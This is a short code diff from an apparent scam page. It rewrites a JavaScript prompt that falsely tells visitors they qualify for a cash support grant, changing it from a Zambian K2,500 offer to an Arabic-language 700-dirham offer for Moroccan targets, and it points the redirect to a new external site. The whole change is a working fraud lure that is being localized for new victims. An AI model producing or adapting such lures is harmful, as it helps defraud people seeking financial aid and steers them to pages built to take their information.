@@ -1,5 +1,5 @@
-var password = 'Submit Now'
-password=prompt('CDF Grants Portal: Congratulations, you are eligible to receive the K2,500 Support Grant Cash Transfer, Kindly press OK to submit your information and receive K2,500 now','Submit Now');
-if (password != 'Submit Now') {
-location.href='https://za-jobs-portal.website/';
+var password = 'أرسل الآن'
+password=prompt('تهانينا! أنت مؤهل للاستفادة من منحة الدعم المالي بقيمة 700 درهم مغربي (700 DH). يرجى الضغط على “موافق” لتأكيد معلوماتك واستلام مبلغ 700 درهم مغربي (700 DH) الآن.','Submit Now');
+if (password != 'أرسل الآن') {
+location.href='https://gmoni.info/MAD-700-CAN.html';
 }
